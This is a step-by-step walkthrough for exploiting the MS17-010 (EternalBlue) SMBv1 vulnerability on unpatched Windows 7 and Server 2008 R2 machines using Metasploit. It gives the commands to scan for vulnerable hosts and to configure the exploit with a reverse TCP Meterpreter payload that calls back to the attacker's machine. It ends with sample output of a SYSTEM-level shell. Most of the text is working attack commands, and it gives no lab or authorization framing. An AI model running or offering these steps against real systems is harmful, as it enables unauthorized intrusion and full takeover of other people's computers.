# Walkthrough: Exploiting MS17-010 (EternalBlue)

This document describes the steps to exploit the SMBv1 vulnerability on Windows systems using the EternalBlue module in Metasploit.

**Target**: A Windows 7 / Windows Server 2008 R2 machine (without the MS17-010 security patch)
**Objective**: To obtain a Meterpreter shell with SYSTEM privileges.

-----

### Phase 1: Preparation and Scanning

Ensure you are on the same network as the target. First, we will verify if the target is vulnerable using an auxiliary scanner module.

1.  **Launch Metasploit**

    ```bash
    msfconsole
    ```

2.  **Search for and Use the Scanner Module**

    ```
    msf6 > search ms17-010
    msf6 > use auxiliary/scanner/smb/smb_ms17_010
    ```

3.  **Set Options**
    Replace `192.168.1.10` with your target's IP address.

    ```
    msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.10
    msf6 auxiliary(scanner/smb/smb_ms17_010) > run
    ```

4.  **Analyze the Results**
    If the output indicates `Host is likely VULNERABLE to MS17-010`, you can proceed to the exploitation phase.

### Phase 2: Exploitation

Now we will use the exploit module to gain access.

1.  **Use the Exploit Module**

    ```
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    ```

2.  **View the Required Options**

    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
    ```

    We need to set `RHOSTS` and `LHOST`.

3.  **Set the Exploit Options**

      * `RHOSTS`: The IP address of the target machine.
      * `LHOST`: The IP address of your machine (the attacking machine).
      * `PAYLOAD`: We will use the 64-bit Meterpreter reverse TCP payload.

    <!-- end list -->

    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.10.1
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
    ```

4.  **Run the Exploit**

    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
    ```

### Phase 3: Post-Exploitation

If successful, you will see a `WIN` message and a Meterpreter session will open.

[] Sending encoded stage (206403 bytes) to 192.168.1.10
[] Meterpreter session 1 opened (10.10.10.1:4444 -\> 192.168.1.10:49157) at ...

meterpreter \>

You now have full control over the target machine. Verify your access rights:
meterpreter \> getuid
Server username: NT AUTHORITY\\SYSTEM

**Walkthrough complete.**
